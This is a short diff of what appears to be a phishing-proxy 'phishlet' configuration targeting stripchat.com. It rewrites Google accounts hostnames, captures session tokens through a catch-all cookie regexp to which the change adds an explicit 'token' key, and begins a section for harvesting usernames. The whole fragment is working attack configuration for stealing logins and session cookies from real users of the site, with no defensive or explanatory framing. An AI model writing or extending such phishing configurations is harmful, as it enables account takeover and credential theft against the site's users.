@@ -14,9 +14,9 @@ sub_filters:
   - {triggers_on: 'www.stripchat.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 auth_tokens:
   - domain: 'sv.stripchat.com'
-    keys: ['.*,regexp']
+    keys: ['token','.*,regexp']
   - domain: '.stripchat.com'
-    keys: ['.*,regexp']
+    keys: ['token','.*,regexp']
 credentials:
   username:
     key: ''
